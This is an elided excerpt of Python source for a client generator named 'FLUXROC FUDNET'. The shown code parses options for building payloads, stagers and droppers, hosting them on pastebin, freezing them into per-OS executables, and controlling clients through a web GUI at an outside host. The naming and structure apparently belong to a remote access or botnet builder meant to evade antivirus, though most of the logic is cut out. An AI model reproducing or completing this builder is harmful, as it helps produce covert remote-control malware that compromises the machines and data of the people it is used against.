...
optional arguments:
  ...
  --gui           generate client controllable via web browser GUI at https://prosec.verexan.com/
...
# modules
from flxroc.core import util
from flxroc.core import security 
from flxroc.core import generators
...
def main(*args, **kwargs):
    ...
    if not kwargs:
        parser = argparse.ArgumentParser(
            prog='client.py',
            description="Generator (FLUXROC FUDNET)"
        )
        ...
        parser.add_argument('--gui',
                            action='store_true',
                            help='generate client controllable via web browser GUI at https://prosec.verexan.com',
                            default=False)
...
'''
    ...
    if options.pastebin:
        ...
        dirs = ['modules/payloads','flxroc/modules/payloads','flxroc/flxroc/modules/payloads']
        dirname = '.'
        for d in dirs:
            if os.path.isdir(d):
                dirname = d
...
def _stager(options, **kwargs):
    ...
    if options.pastebin:
        ...
        dirs = ['modules/stagers','flxroc/modules/stagers','flxroc/flxroc/modules/stagers']
        dirname = '.'
        for d in dirs:
            if os.path.isdir(d):
                dirname = d
...
def _dropper(options, **kwargs):
    ...
    if options.freeze:
        name = 'flxroc_{operating_system}_{architecture}_{var}.py'.format(operating_system=options.operating_system, architecture=options.architecture, var=kwargs['var']) if not options.name else options.name
    else:
        name = 'flxroc_{var}.py'.format(var=kwargs['var'])
